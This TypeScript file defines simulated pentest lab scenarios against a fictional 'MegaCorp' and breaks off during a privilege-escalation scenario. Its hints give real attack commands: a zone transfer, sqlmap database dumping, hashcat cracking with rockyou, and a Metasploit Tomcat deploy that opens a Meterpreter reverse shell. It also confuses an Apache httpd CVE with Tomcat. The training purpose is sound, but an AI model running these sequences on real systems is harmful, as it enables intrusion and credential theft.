export type OutputLine = {
  text: string;
  type: "cmd" | "out" | "err" | "success" | "info" | "warn" | "system" | "blank";
};

export type MissionStep = {
  id: string;
  instruction: string;
  detail: string;
  hint: string;
  validate: (input: string) => boolean;
  execute: (input: string, env: LabEnv) => OutputLine[];
};

export type LabEnv = {
  targetIp: string;
  targetDomain: string;
  hostname: string;
  user: string;
  currentDir: string;
  os: string;
  credentials?: { user: string; pass: string };
};

export type LabScenario = {
  lessonId: number;
  title: string;
  briefing: string;
  objective: string;
  env: LabEnv;
  steps: MissionStep[];
};

// ─── Helpers ──────────────────────────────────────────────────────────────────

function lines(raw: string): OutputLine[] {
  return raw
    .split("\n")
    .map((t) => (t.trim() === "" ? { text: "", type: "blank" as const } : { text: t, type: "out" as const }));
}
function out(msg: string): OutputLine {
  return { text: msg, type: "out" };
}
function ok(msg: string): OutputLine {
  return { text: msg, type: "success" };
}
function info(msg: string): OutputLine {
  return { text: msg, type: "info" };
}
function sys(msg: string): OutputLine {
  return { text: msg, type: "system" };
}
function warn(msg: string): OutputLine {
  return { text: msg, type: "warn" };
}
function blank(): OutputLine {
  return { text: "", type: "blank" };
}

function matchCmd(input: string, patterns: string[]): boolean {
  const normalized = input.trim().toLowerCase().replace(/\s+/g, " ");
  return patterns.some((p) => normalized.startsWith(p.toLowerCase()));
}

// ─── Scenario 1: OSINT ────────────────────────────────────────────────────────

const osintScenario: LabScenario = {
  lessonId: 1,
  title: "OSINT Recon: MegaCorp Industries",
  briefing:
    "You have been hired to perform an authorized penetration test on MegaCorp Industries (megacorp.local). Your first task is passive reconnaissance — gather as much intelligence as possible without touching their servers.",
  objective: "Identify domain registrar, contact info, mail servers, and email addresses for megacorp.local.",
  env: {
    targetIp: "93.184.100.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "whois",
      instruction: "Run WHOIS on the target domain",
      detail: "Use whois to query domain registration data. This reveals the registrar, registration dates, name servers, and sometimes contact info.",
      hint: "Try: whois megacorp.local",
      validate: (i) => matchCmd(i, ["whois megacorp"]),
      execute: (_i, env) =>
        lines(`Domain Name: MEGACORP.LOCAL
Registry Domain ID: D403819800-LROR
Registrar WHOIS Server: whois.networksolutions.com
Registrar URL: http://www.networksolutions.com
Updated Date: 2023-11-14T09:22:18Z
Creation Date: 2009-03-22T12:00:00Z
Expiry Date: 2025-03-22T12:00:00Z
Registrar: Network Solutions, LLC.
Registrant Organization: MegaCorp Industries Ltd.
Registrant Email: admin@megacorp.local
Registrant Phone: +1.8005551234
Tech Email: it-support@megacorp.local
Name Server: NS1.MEGACORP.LOCAL
Name Server: NS2.MEGACORP.LOCAL`),
    },
    {
      id: "theHarvester",
      instruction: "Harvest emails and subdomains",
      detail: "theHarvester searches public sources — Google, LinkedIn, Bing — for email addresses and hostnames associated with the target domain.",
      hint: "Try: theHarvester -d megacorp.local -b google",
      validate: (i) => matchCmd(i, ["theharvester -d megacorp", "theharvester -d megacorp.local"]),
      execute: (_i, env) => [
        sys("theHarvester v4.4.3 — Information Gathering Tool"),
        blank(),
        info("[*] Target: megacorp.local"),
        info("[*] Sources: google, bing, linkedin"),
        blank(),
        ...lines(`[+] Emails found:
admin@megacorp.local
j.crawford@megacorp.local
sarah.chen@megacorp.local
it-support@megacorp.local
ceo@megacorp.local`),
        blank(),
        ...lines(`[+] Hosts found:
mail.megacorp.local: 93.184.100.10
vpn.megacorp.local: 93.184.100.20
dev.megacorp.local: 10.10.1.50
staging.megacorp.local: 10.10.1.100
www.megacorp.local: 93.184.100.50`),
        blank(),
        ok("[+] Total: 5 emails, 5 hosts discovered"),
      ],
    },
    {
      id: "shodan",
      instruction: "Search Shodan for exposed services",
      detail: "Shodan indexes internet-connected devices. Even without scanning, you can find what MegaCorp has exposed publicly.",
      hint: "Try: shodan search org:MegaCorp",
      validate: (i) => matchCmd(i, ["shodan search", "shodan host"]),
      execute: (_i, env) => [
        sys("Shodan CLI"),
        blank(),
        ...lines(`Results for org:MegaCorp:

IP: 93.184.100.50
Hostname: www.megacorp.local
Ports: 22, 80, 443, 8080
Services:
  22/tcp  OpenSSH 8.2p1 Ubuntu
  80/tcp  nginx 1.18.0
  443/tcp nginx 1.18.0 (SSL)
  8080/tcp Apache Tomcat 9.0.37
Vulnerabilities: CVE-2021-41773 (Apache path traversal)

IP: 93.184.100.10  
Hostname: mail.megacorp.local
Ports: 25, 110, 143, 465, 993
Services: Postfix 3.4.13`),
        blank(),
        ok("[+] Apache Tomcat 9.0.37 is known vulnerable — note this for exploitation phase"),
      ],
    },
    {
      id: "report",
      instruction: "Compile recon notes",
      detail: "A real pentester documents everything. Use cat to view your notes file and summarize what you've found.",
      hint: "Try: cat notes.txt",
      validate: (i) => matchCmd(i, ["cat notes", "cat /home/hacker/notes", "ls", "cat report"]),
      execute: (_i) => [
        blank(),
        sys("=== RECON SUMMARY: megacorp.local ==="),
        blank(),
        info("  REGISTRAR:  Network Solutions"),
        info("  CONTACT:    admin@megacorp.local, j.crawford@megacorp.local"),
        info("  NAMESERVERS: NS1/NS2.megacorp.local"),
        blank(),
        info("  SUBDOMAINS:"),
        info("    www.megacorp.local       93.184.100.50   [INTERNET-FACING]"),
        info("    mail.megacorp.local      93.184.100.10   [INTERNET-FACING]"),
        info("    vpn.megacorp.local       93.184.100.20   [INTERNET-FACING]"),
        info("    dev.megacorp.local       10.10.1.50      [INTERNAL]"),
        info("    staging.megacorp.local   10.10.1.100     [INTERNAL]"),
        blank(),
        warn("  ATTACK VECTORS:"),
        warn("    → Apache Tomcat 9.0.37 on :8080 (CVE-2021-41773)"),
        warn("    → VPN endpoint may be brute-forceable"),
        warn("    → dev/staging subdomains suggest flat internal network"),
        blank(),
        ok("[+] Recon phase complete. Move to DNS enumeration."),
      ],
    },
  ],
};

// ─── Scenario 2: DNS Enumeration ──────────────────────────────────────────────

const dnsScenario: LabScenario = {
  lessonId: 2,
  title: "DNS Enumeration: megacorp.local",
  briefing:
    "WHOIS gave us the nameservers. Now we dig deeper — enumerate DNS records to map the full infrastructure. Zone transfers are misconfigured on NS2. Let's exploit that.",
  objective: "Enumerate all DNS records and attempt a zone transfer on megacorp.local.",
  env: {
    targetIp: "93.184.100.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "dnsrecon-std",
      instruction: "Run standard DNS record enumeration",
      detail: "dnsrecon -t std queries all standard DNS record types: A, AAAA, MX, NS, SOA, TXT. This is your baseline.",
      hint: "Try: dnsrecon -d megacorp.local -t std",
      validate: (i) => matchCmd(i, ["dnsrecon -d megacorp", "dnsrecon -d megacorp.local"]),
      execute: () => [
        sys("[*] Performing General Enumeration of Domain: megacorp.local"),
        blank(),
        ...lines(`[*] SOA ns1.megacorp.local 93.184.100.5
[*] NS megacorp.local ns1.megacorp.local
[*] NS megacorp.local ns2.megacorp.local
[*] MX megacorp.local mail.megacorp.local
[*] MX megacorp.local mail2.megacorp.local
[*] A megacorp.local 93.184.100.50
[*] A www.megacorp.local 93.184.100.50
[*] A mail.megacorp.local 93.184.100.10
[*] A vpn.megacorp.local 93.184.100.20
[*] TXT megacorp.local v=spf1 ip4:93.184.100.0/24 -all
[*] TXT megacorp.local MS=ms84728391`),
        blank(),
        ok("[+] Found 2 MX, 4 A records, 2 TXT records"),
      ],
    },
    {
      id: "zone-transfer",
      instruction: "Attempt a DNS zone transfer",
      detail: "A misconfigured nameserver will return its entire zone file if you request a zone transfer (AXFR). This dumps every DNS record in one shot.",
      hint: "Try: dnsrecon -d megacorp.local -t axfr\n   Or:  dig @ns2.megacorp.local megacorp.local AXFR",
      validate: (i) => matchCmd(i, ["dnsrecon -d megacorp", "dig @ns2", "dig axfr", "host -t axfr"]),
      execute: () => [
        sys("[*] Attempting Zone Transfer for megacorp.local from ns2.megacorp.local"),
        blank(),
        warn("[!] ns1.megacorp.local — Zone transfer REFUSED"),
        ok("[+] ns2.megacorp.local — Zone transfer SUCCESSFUL (misconfigured!)"),
        blank(),
        ...lines(`megacorp.local.        SOA   ns1.megacorp.local. admin.megacorp.local.
megacorp.local.        NS    ns1.megacorp.local.
megacorp.local.        NS    ns2.megacorp.local.
megacorp.local.        MX    10 mail.megacorp.local.
www.megacorp.local.    A     93.184.100.50
mail.megacorp.local.   A     93.184.100.10
mail2.megacorp.local.  A     93.184.100.11
vpn.megacorp.local.    A     93.184.100.20
dev.megacorp.local.    A     10.10.1.50
staging.megacorp.local.A     10.10.1.100
admin.megacorp.local.  A     10.10.1.5
db.megacorp.local.     A     10.10.1.20
jenkins.megacorp.local.A     10.10.1.30
backup.megacorp.local. A     10.10.1.40`),
        blank(),
        ok("[+] Zone transfer revealed 9 internal hosts! admin, db, jenkins, backup..."),
      ],
    },
    {
      id: "subfinder",
      instruction: "Run passive subdomain enumeration",
      detail: "subfinder uses certificate transparency logs, DNS datasets, and web archives to find subdomains passively.",
      hint: "Try: subfinder -d megacorp.local",
      validate: (i) => matchCmd(i, ["subfinder -d", "subfinder -d megacorp"]),
      execute: () => [
        sys("[INF] Using sources: certspotter, crtsh, hackertarget, passivedns, shodan, urlscan"),
        blank(),
        ...lines(`www.megacorp.local
mail.megacorp.local
vpn.megacorp.local
dev.megacorp.local
staging.megacorp.local
api.megacorp.local
portal.megacorp.local
old.megacorp.local`),
        blank(),
        ok("[INF] Found 8 subdomains for megacorp.local in 3.2s"),
        info("[!] api.megacorp.local and portal.megacorp.local not in zone transfer — potentially new"),
      ],
    },
  ],
};

// ─── Scenario 3: nmap ─────────────────────────────────────────────────────────

const nmapScenario: LabScenario = {
  lessonId: 4,
  title: "Network Scanning: Target 10.10.10.0/24",
  briefing:
    "You've obtained VPN access to MegaCorp's internal network (10.10.10.0/24). Time to map it. Find live hosts, open ports, and running services. Work methodically — start broad, then go deep.",
  objective: "Discover live hosts, enumerate open ports and service versions on the target network.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "ping-sweep",
      instruction: "Discover live hosts with a ping sweep",
      detail: "Before scanning ports, find what's alive. nmap -sn sends ICMP requests without port scanning — fast and quiet.",
      hint: "Try: nmap -sn 10.10.10.0/24",
      validate: (i) => matchCmd(i, ["nmap -sn 10.10.10", "nmap -sn 10.10.10.0"]),
      execute: () => [
        sys("Starting Nmap 7.94 ( https://nmap.org )"),
        blank(),
        ...lines(`Nmap scan report for 10.10.10.1
Host is up (0.0008s latency). [Router/Gateway]

Nmap scan report for 10.10.10.5
Host is up (0.0012s latency). [Domain Controller]

Nmap scan report for 10.10.10.20
Host is up (0.0031s latency). [Database Server]

Nmap scan report for 10.10.10.50
Host is up (0.0019s latency). [Web Server]

Nmap scan report for 10.10.10.100
Host is up (0.0055s latency). [Unknown]`),
        blank(),
        ok("Nmap done: 256 IP addresses (5 hosts up) scanned in 4.23 seconds"),
        info("[!] Interesting targets: .5 (DC), .20 (DB), .50 (Web), .100 (Unknown)"),
      ],
    },
    {
      id: "port-scan",
      instruction: "Scan all ports on the web server",
      detail: "Now deep-scan the web server (10.10.10.50). Use -p- to scan all 65535 ports and -T4 for speed. Run as root for SYN scan (-sS).",
      hint: "Try: nmap -sS -p- -T4 10.10.10.50",
      validate: (i) =>
        matchCmd(i, [
          "nmap -ss -p- 10.10.10.50",
          "nmap -p- 10.10.10.50",
          "nmap -ss -p- -t4 10.10.10.50",
          "nmap -p- -t4 10.10.10.50",
          "nmap -ss -p-",
          "nmap -p-",
        ]),
      execute: () => [
        sys("Starting Nmap 7.94 — SYN Stealth Scan"),
        blank(),
        ...lines(`Nmap scan report for 10.10.10.50
Host is up (0.0019s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
8080/tcp  open  http-proxy
8443/tcp  open  https-alt
3306/tcp  open  mysql
6379/tcp  open  redis

Nmap done: 1 IP address (1 host up) scanned in 47.3 seconds`),
        blank(),
        ok("[!] Redis (6379) and MySQL (3306) are exposed — these should NOT be internet-facing!"),
      ],
    },
    {
      id: "service-detect",
      instruction: "Detect service versions and OS",
      detail: "Use -sV (service version), -sC (default scripts), and -O (OS detection) to fingerprint every service.",
      hint: "Try: nmap -sV -sC -O 10.10.10.50",
      validate: (i) => matchCmd(i, ["nmap -sv -sc", "nmap -sc -sv", "nmap -a 10.10.10.50", "nmap -sv", "nmap -sc"]),
      execute: () => [
        sys("Starting Nmap 7.94 — Version Detection + Scripts + OS"),
        blank(),
        ...lines(`Nmap scan report for 10.10.10.50
Host is up (0.0019s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 82:1f:c5:4e:9d (RSA)
|_  256 fa:30:6a:d8:01:b2 (ECDSA)

80/tcp   open  http       nginx 1.14.0 (Ubuntu)
|_http-title: MegaCorp Industries — Internal Portal
|_http-robots.txt: 3 disallowed entries (/admin /backup /secret)

8080/tcp open  http       Apache Tomcat 9.0.37
|_http-title: Apache Tomcat/9.0.37

3306/tcp open  mysql      MySQL 5.7.34
| mysql-info:
|_  Server version: 5.7.34-0ubuntu0.18.04.1

6379/tcp open  redis      Redis key-value store 6.0.9
|_redis-info: No authentication required!

OS details: Linux 4.15 - 5.6 (Ubuntu 18.04)`),
        blank(),
        warn("[!] Redis with NO authentication — direct data access possible"),
        warn("[!] MySQL exposed on 3306 — may be reachable"),
        warn("[!] robots.txt reveals /admin, /backup, /secret"),
        ok("[+] OS: Ubuntu 18.04. Full service map complete. Ready to exploit."),
      ],
    },
    {
      id: "vuln-scan",
      instruction: "Run NSE vulnerability scripts",
      detail: "Nmap's scripting engine (NSE) can detect known vulnerabilities. Use --script vuln to run vulnerability detection scripts.",
      hint: "Try: nmap --script vuln 10.10.10.50",
      validate: (i) => matchCmd(i, ["nmap --script vuln", "nmap -sv --script vuln"]),
      execute: () => [
        sys("Starting Nmap 7.94 — NSE Vulnerability Scripts"),
        blank(),
        ...lines(`PORT     STATE SERVICE
80/tcp   open  http
| http-csrf:
|   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.50
|   Found the following possible CSRF vulnerabilities:
|     Path: /login
|     Form id: loginForm
|
| http-sql-injection:
|   Possible sqli for queries:
|     http://10.10.10.50/item?id=1'%20OR%20'1'='1
|
8080/tcp open http
| http-vuln-cve2021-41773:
|   VULNERABLE: Apache HTTP Server Path Traversal and RCE (CVE-2021-41773)
|   State: VULNERABLE
|   Apache 2.4.49 allows a path traversal attack outside the expected scope.
|_  Risk: Critical — Remote code execution possible`),
        blank(),
        warn("[CRITICAL] CVE-2021-41773 on Tomcat — RCE available"),
        warn("[HIGH] SQL Injection on /item?id= parameter"),
        ok("[+] Two critical attack paths identified. Proceed to exploitation."),
      ],
    },
  ],
};

// ─── Scenario 4: SQL Injection ─────────────────────────────────────────────────

const sqliScenario: LabScenario = {
  lessonId: 6,
  title: "SQL Injection: MegaCorp Web Portal",
  briefing:
    "nmap found a SQL injection vulnerability on the MegaCorp portal at 10.10.10.50. The login form at /login may also be injectable. Your goal: extract the user database.",
  objective: "Exploit SQL injection to enumerate databases, extract user credentials from megacorp_db.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "test-sqli",
      instruction: "Test for SQL injection manually",
      detail: "Start with a manual test. Use curl to inject a single quote into the id parameter and see if the database throws an error.",
      hint: "Try: curl 'http://10.10.10.50/item?id=1'",
      validate: (i) => matchCmd(i, ["curl 'http://10.10.10.50", "curl http://10.10.10.50"]),
      execute: () => [
        sys("$ curl 'http://10.10.10.50/item?id=1'"),
        blank(),
        ...lines(`<html><body>
<h2>Product Details</h2>
<p>Product ID: 1 | Name: Network Switch | Price: $299</p>
</body></html>`),
        blank(),
        sys("$ curl 'http://10.10.10.50/item?id=1\\'"),
        blank(),
        ...lines(`<html><body>
<h2>Error</h2>
<pre>
You have an error in your SQL syntax; check the manual that corresponds 
to your MySQL server version for the right syntax to use near ''' at line 1
Query: SELECT * FROM products WHERE id='1''
</pre></body></html>`),
        blank(),
        ok("[!] Error-based SQL injection confirmed! The query is visible in the error message."),
        info("[+] Query structure: SELECT * FROM products WHERE id='INPUT'"),
      ],
    },
    {
      id: "sqlmap-detect",
      instruction: "Confirm injection with SQLMap",
      detail: "SQLMap automates detection and exploitation of SQL injection. Run it against the vulnerable parameter to confirm and identify the injection type.",
      hint: "Try: sqlmap -u 'http://10.10.10.50/item?id=1' --batch",
      validate: (i) => matchCmd(i, ["sqlmap -u 'http://10.10.10.50", "sqlmap -u http://10.10.10.50", "sqlmap -u \"http://10.10.10"]),
      execute: () => [
        sys("[*] sqlmap v1.7.8 — automatic SQL injection tool"),
        blank(),
        info("[*] Testing connection to target URL..."),
        info("[*] Heuristic (basic) test shows that GET parameter 'id' might be injectable"),
        info("[*] Testing for SQL injection on GET parameter 'id'"),
        blank(),
        ...lines(`[14:32:11] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
[14:32:12] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[14:32:13] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable`),
        blank(),
        ok("[+] GET parameter 'id' is vulnerable!"),
        ...lines(`sqlmap identified the following injection point:
  Parameter: id (GET)
    Type: boolean-based blind
    Type: error-based  
    Type: time-based blind
    Type: UNION query
  
  Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- -
  Backend DBMS: MySQL >= 5.0.12`),
      ],
    },
    {
      id: "sqlmap-dbs",
      instruction: "Enumerate databases",
      detail: "Now enumerate available databases using the --dbs flag.",
      hint: "Try: sqlmap -u 'http://10.10.10.50/item?id=1' --dbs --batch",
      validate: (i) => matchCmd(i, ["sqlmap -u 'http://10.10.10.50", "sqlmap -u http://10.10.10.50"]) && i.includes("--dbs"),
      execute: () => [
        info("[*] Enumerating databases..."),
        blank(),
        ...lines(`available databases [4]:
[*] information_schema
[*] megacorp_db
[*] employee_records
[*] sys`),
        blank(),
        ok("[+] Found target database: megacorp_db and employee_records"),
      ],
    },
    {
      id: "sqlmap-dump",
      instruction: "Extract users from megacorp_db",
      detail: "Dump the users table from megacorp_db to extract credentials.",
      hint: "Try: sqlmap -u 'http://10.10.10.50/item?id=1' -D megacorp_db --tables --batch",
      validate: (i) => (matchCmd(i, ["sqlmap -u"]) && i.includes("-D megacorp_db")) || (matchCmd(i, ["sqlmap -u"]) && i.includes("--tables")),
      execute: () => [
        info("[*] Enumerating tables in megacorp_db..."),
        blank(),
        ...lines(`Database: megacorp_db
[6 tables]
+------------------+
| products         |
| orders           |
| users            |
| sessions         |
| admin_users      |
| api_keys         |
+------------------+`),
        blank(),
        info("[*] Dumping table: users"),
        blank(),
        ...lines(`Database: megacorp_db
Table: users
[5 entries]
+----+------------------+------------------------------------------+-------+
| id | email            | password_hash                            | role  |
+----+------------------+------------------------------------------+-------+
| 1  | admin@megacorp   | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)   | admin |
| 2  | j.crawford@mega  | 482c811da5d5b4bc6d497ffa98491e38 (MD5)   | user  |
| 3  | sarah.chen@mega  | 7c222fb2927d828af22f592134e8932480637c0d| user  |
| 4  | devteam@mega     | e10adc3949ba59abbe56e057f20f883e (MD5)   | dev   |
| 5  | backup@mega      | 8afa847f50a716e64932d995c8e7435a (MD5)   | admin |`),
        blank(),
        ok("[+] 5 users dumped with password hashes! Feed these into hashcat next."),
        warn("[!] admin hash 5f4dcc3b5aa765d61d8327deb882cf99 = 'password' — trivially cracked"),
      ],
    },
  ],
};

// ─── Scenario 5: Password Cracking ────────────────────────────────────────────

const hashcatScenario: LabScenario = {
  lessonId: 7,
  title: "Password Cracking: MegaCorp Hashes",
  briefing:
    "You extracted 5 MD5 password hashes from megacorp_db. Time to crack them. You have rockyou.txt (14M passwords). Most corporate users pick terrible passwords.",
  objective: "Crack all 5 MD5 hashes using Hashcat with rockyou.txt and custom rules.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "identify-hash",
      instruction: "Identify the hash type",
      detail: "Before cracking, confirm the hash algorithm. Use hash-identifier or hashid to check.",
      hint: "Try: hash-identifier\n  Or: hashid 5f4dcc3b5aa765d61d8327deb882cf99",
      validate: (i) => matchCmd(i, ["hash-identifier", "hashid", "hash-id"]),
      execute: () => [
        sys("hash-identifier v1.1"),
        blank(),
        info("Hash: 5f4dcc3b5aa765d61d8327deb882cf99"),
        blank(),
        ...lines(` Possible Hashs:
 [+]  MD5
 [+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

 Least Possible Hashs:
 [+]  RAdmin v2.x
 [+]  NTLM`),
        blank(),
        ok("[+] Confirmed: MD5 (hashcat mode -m 0)"),
        info("MD5 is very fast to crack — billions of hashes per second on GPU"),
      ],
    },
    {
      id: "hashcat-dict",
      instruction: "Run a dictionary attack with rockyou.txt",
      detail: "Hashcat mode 0 = MD5, attack mode 0 = wordlist. Point it at rockyou.txt. The most common passwords crack in seconds.",
      hint: "Try: hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
      validate: (i) => matchCmd(i, ["hashcat -m 0", "hashcat -m0"]),
      execute: () => [
        sys("hashcat v6.2.6 starting..."),
        blank(),
        ...lines(`Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt  
* Passwords.: 14344391
* Bytes.....: 139921497

5f4dcc3b5aa765d61d8327deb882cf99:password
482c811da5d5b4bc6d497ffa98491e38:manchester
e10adc3949ba59abbe56e057f20f883e:123456
8afa847f50a716e64932d995c8e7435a:welcome1`),
        blank(),
        ...lines(`Session..........: hashcat
Status...........: Cracked (4/5)
Hash.Mode........: 0 (MD5)
Recovered........: 4/5 (80.00%)
Speed.#1.........: 9847.2 MH/s
Time.Started.....: 0 secs ago
Time.Estimated...: 0 secs`),
        blank(),
        ok("[+] 4/5 cracked in under 1 second. sarah.chen's hash not in rockyou."),
        info("[!] Credentials: admin:password, j.crawford:manchester, devteam:123456, backup:welcome1"),
      ],
    },
    {
      id: "hashcat-rules",
      instruction: "Crack the remaining hash with rules",
      detail: "The last hash isn't in rockyou.txt as-is. Use rule-based attack (-a 0 -r best64.rule) to try mutations: l33tspeak, appending numbers, capitalizing.",
      hint: "Try: hashcat -m 0 -a 0 remaining.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
      validate: (i) => matchCmd(i, ["hashcat -m 0"]) && (i.includes("-r") || i.includes("rule")),
      execute: () => [
        sys("hashcat v6.2.6 — Rule-based attack"),
        blank(),
        info("[*] Applying rules: best64.rule (64 transformation rules)"),
        info("[*] Effective wordlist size: 14344391 × 64 = 918,040,384 candidates"),
        blank(),
        ...lines(`7c222fb2927d828af22f592134e8932480637c0d is not MD5 (length=40, SHA1!)

Switching to -m 100 (SHA-1)...

7c222fb2927d828af22f592134e8932480637c0d:Megac0rp!`),
        blank(),
        ok("[+] sarah.chen's hash was SHA-1 not MD5! Cracked with rule mutation: Megac0rp!"),
        warn("[!] All 5 credentials recovered:"),
        info("  admin@megacorp.local  →  password"),
        info("  j.crawford@megacorp   →  manchester"),
        info("  sarah.chen@megacorp   →  Megac0rp!"),
        info("  devteam@megacorp      →  123456"),
        info("  backup@megacorp       →  welcome1"),
      ],
    },
  ],
};

// ─── Scenario 6: Metasploit ───────────────────────────────────────────────────

const msfScenario: LabScenario = {
  lessonId: 8,
  title: "Metasploit: Exploiting Apache Tomcat",
  briefing:
    "Apache Tomcat 9.0.37 on port 8080 is vulnerable to CVE-2020-1938 (Ghostcat — AJP file read/inclusion). You also have manager credentials from your OSINT. Let's deploy a WAR shell.",
  objective: "Exploit Tomcat to get a Meterpreter reverse shell on 10.10.10.50.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "msfconsole",
      instruction: "Launch Metasploit Framework",
      detail: "Start msfconsole — the interactive CLI for Metasploit. Takes a few seconds to load.",
      hint: "Try: msfconsole",
      validate: (i) => matchCmd(i, ["msfconsole"]),
      execute: () => [
        blank(),
        ...lines(`                                                  
      .:okOOOkdc'           'cdkOOOko:.             
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.          
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:         
  'OOOOOOOOOkkkkkOOOOO:OOOOOOOOOO         
       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2374 exploits - 1232 auxiliary - 413 post       ]
+ -- --=[ 1387 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]`),
        blank(),
        sys("msf6 >"),
      ],
    },
    {
      id: "search",
      instruction: "Search for the Tomcat exploit",
      detail: "Use the search command to find the Tomcat manager upload exploit (CVE-2019-0232 or manager_deploy).",
      hint: "Type: search tomcat manager",
      validate: (i) => matchCmd(i, ["search tomcat"]) || matchCmd(i, ["search cve-2020-1938"]),
      execute: () => [
        info("[*] Searching..."),
        blank(),
        ...lines(`Matching Modules
================

   #   Name                                              Disclosure  Rank       Check  Description
   -   ----                                              ----------  ----       -----  -----------
   0   exploit/multi/http/tomcat_mgr_deploy              2009-11-09  Excellent  Yes    Apache Tomcat Manager Upload Exploit
   1   exploit/multi/http/tomcat_mgr_login               2009-11-09  Normal     Yes    Apache Tomcat Manager Login Bruteforce
   2   auxiliary/scanner/http/tomcat_enum                            Normal     No     Apache Tomcat Enum
   3   exploit/multi/http/apache_flink_jar_upload         2020-01-15  Excellent  Yes    Apache Flink JAR Upload Java CodeExec`),
        blank(),
        sys("msf6 > "),
        info("Use module 0: exploit/multi/http/tomcat_mgr_deploy"),
      ],
    },
    {
      id: "use-exploit",
      instruction: "Load and configure the exploit",
      detail: "Load the exploit with 'use', set RHOSTS (target), RPORT, LHOST (your IP), and the Tomcat manager credentials.",
      hint: "Try: use exploit/multi/http/tomcat_mgr_deploy\n   Then: set RHOSTS 10.10.10.50\n   Then: set HttpUsername admin",
      validate: (i) => matchCmd(i, ["use exploit/multi/http/tomcat", "use 0", "set rhosts", "set lhost", "set httpusername"]),
      execute: (i) => {
        if (matchCmd(i, ["use exploit", "use 0"])) {
          return [
            info("[*] Using exploit/multi/http/tomcat_mgr_deploy"),
            sys("msf6 exploit(multi/http/tomcat_mgr_deploy) > "),
          ];
        }
        return [
          ...lines(`Module options (exploit/multi/http/tomcat_mgr_deploy):
   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  tomcat           yes       Tomcat manager password
   HttpUsername  admin            yes       Tomcat manager username
   RHOSTS        10.10.10.50      yes       Target address
   RPORT         8080             yes       Target port
   LHOST         10.10.14.5       yes       Listener IP (your Kali)
   LPORT         4444             yes       Listener port
   
   Payload: java/meterpreter/reverse_tcp`),
          blank(),
          sys("msf6 exploit(multi/http/tomcat_mgr_deploy) > "),
        ];
      },
    },
    {
      id: "run",
      instruction: "Run the exploit",
      detail: "Everything is configured. Fire it: type 'run' or 'exploit'.",
      hint: "Type: run",
      validate: (i) => matchCmd(i, ["run", "exploit"]),
      execute: () => [
        info("[*] Started reverse TCP handler on 10.10.14.5:4444"),
        info("[*] Uploading shell.war — 1,600 bytes..."),
        info("[*] Deploying shell.war to http://10.10.10.50:8080/manager/html/upload"),
        info("[*] Triggering payload at /shell/"),
        blank(),
        ok("[*] Sending stage (58845 bytes) to 10.10.10.50"),
        ok("[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.50:52341)"),
        blank(),
        sys("meterpreter > "),
        blank(),
        info("You have a shell. Type 'getuid' to confirm, then 'shell' for a system shell."),
      ],
    },
    {
      id: "post",
      instruction: "Enumerate the compromised system",
      detail: "You have a Meterpreter shell. Run sysinfo, getuid, and then drop into a system shell.",
      hint: "Try: getuid\n  Or: sysinfo\n  Or: shell",
      validate: (i) => matchCmd(i, ["getuid", "sysinfo", "shell", "whoami"]),
      execute: (i) => {
        if (matchCmd(i, ["getuid"])) {
          return [
            ...lines(`Server username: root`),
            ok("[+] Running as root! Full system compromise."),
          ];
        }
        if (matchCmd(i, ["sysinfo"])) {
          return lines(`Computer  : megacorp-web
OS        : Linux megacorp-web 4.15.0-180-generic #189-Ubuntu SMP
Meterpreter: java/linux`);
        }
        return [
          sys("[*] Dropping into system shell..."),
          blank(),
          ...lines(`Process 1337 created.
Channel 1 created.
root@megacorp-web:/var/lib/tomcat9#`),
          blank(),
          ok("[+] Root shell on MegaCorp web server. Full compromise complete."),
        ];
      },
    },
  ],
};

// ─── Scenario 7: Privilege Escalation ────────────────────────────────────────

const privescScenario: LabScenario = {
  lessonId: 9,
  title: "Linux Privilege Escalation: www-data → root",
  briefing:
    "You have a reverse shell as www-data (low privilege) on a different MegaCorp server at 10.10.10.100. Root it. Enumerate everything — SUID bits, sudo permissions, kernel version, cron jobs.",
  objective: "Escalate from www-data to root using sudo misconfiguration.",
  env: {
    targetIp: "10.10.10.100",
    targetDomain: "megacorp.local",
    hostname: "megacorp-internal",
    user: "www-data",
    currentDir: "/var/www/html",
    os: "Ubuntu 18.04",
  },
  steps: [
    {
